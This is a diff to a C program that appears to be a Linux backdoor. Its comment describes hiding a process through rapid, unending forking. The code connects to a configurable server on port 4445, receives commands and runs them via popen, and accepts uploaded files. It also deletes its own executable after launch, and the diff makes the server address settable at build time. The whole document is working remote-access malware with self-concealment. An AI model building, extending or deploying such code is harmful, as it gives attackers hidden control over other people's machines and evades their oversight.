@@ -1,6 +1,5 @@
 /*
  * this is a simple model of process hide in linux by fast and unstop fork
- * TODO: add a timer which will stop the process when socket error occurs
  */
 
 #include <stdlib.h>
@@ -16,10 +15,10 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 
+#ifndef SERVER_IP
+    #define SERVER_IP "127.0.0.1"    //定义服务器IP地址
+#endif
 
-#define DEBUG 0                  //定义开发模式
-
-#define SERVER_IP "127.0.0.1"    //定义服务器IP地址
 #define SERVER_PORT 4445         //定义服务器端口
 #define PATH_MAX 1024            //定义文件路径最大长度
 #define BUFSIZE 4096             //定义缓冲区大小
@@ -46,8 +45,9 @@ int create_socket(char *host_ip, int port)
     struct sockaddr_in servaddr;
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
-        if(DEBUG)
-            printf("create socket failed!\n");
+#ifdef DEBUG
+        printf("create socket failed!\n");
+#endif
         exit(-1);
     }
 
@@ -57,8 +57,9 @@ int create_socket(char *host_ip, int port)
     servaddr.sin_addr.s_addr=inet_addr(host_ip);
 
     if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0){
-        if (DEBUG)
-            printf("connect failed!\n");
+#ifdef DEBUG
+        printf("connect failed!\n");
+#endif
         close(sockfd);
         exit(-1);
     }
@@ -73,8 +74,9 @@ int read_cmd(int sockfd, char *result)
     int bytes = recv(sockfd, result, BUFSIZE, 0);
     if(bytes == -1)
     {
-        if(DEBUG)
-            printf("read command from server failed\n");
+#ifdef DEBUG
+        printf("read command from server failed\n");
+#endif
         exit(-1);
     }
     return bytes;
@@ -115,11 +117,10 @@ int executeCMD(const char *cmd, char *result)
     }   
     else  
     {   
-        if(DEBUG)
-        {
-            printf("popen %s error\n", ps);
-            exit(-1);
-        }
+#ifdef DEBUG
+        printf("popen %s error\n", ps);
+        exit(-1);
+#endif
         return 0;
     }   
 } 
@@ -148,8 +149,9 @@ int parse_cmd(int sockfd, char *cmd, char *result)
         while(cmd[line_end] != '\n' && line_end < strlen(cmd)-1) line_end++;
         char cmd_run[BUFSIZE];
         strncpy(cmd_run, cmd+index, line_end - index + 1);
-        if (DEBUG)
-            printf("run cmd: %s\n", cmd_run);
+#ifdef DEBUG
+        printf("run cmd: %s\n", cmd_run);
+#endif
         ret = executeCMD(cmd_run, result);
     }
     else if(strncmp(cmd, "put:", 4) == 0)
@@ -188,8 +190,9 @@ int parse_cmd(int sockfd, char *cmd, char *result)
                 int wbytes = fwrite(buf, 1, bytes, fp);
                 if (wbytes != bytes)
                 {
-                    if (DEBUG)
-                        printf("something goes wrong when writing file\n");
+#ifdef DEBUG
+                    printf("something goes wrong when writing file\n");
+#endif
                     break;
                 }
             }
@@ -251,10 +254,11 @@ int parse_cmd(int sockfd, char *cmd, char *result)
 int main()
 {
     char *self_path = getpath();
-    
+
+#ifndef DEBUG
     //启动程序后删除可执行文件
     remove(self_path);
-    
+#endif 
     int count = -1;
     while(1)
     {
@@ -262,8 +266,9 @@ int main()
         pid_t pid = fork();
         if (pid < 0)
         {
-            if(DEBUG)
-                printf("there is something wrong\n");
+#ifdef DEBUG
+            printf("there is something wrong\n");
+#endif
         }
         if (pid > 0) //父进程
         {
@@ -294,8 +299,10 @@ int main()
         else
         {
             usleep(500);
-            if (DEBUG)
+#ifdef DEBUG
+            if(count > 0x5000)
                 return 0;
+#endif
         }
     }
     return 0;
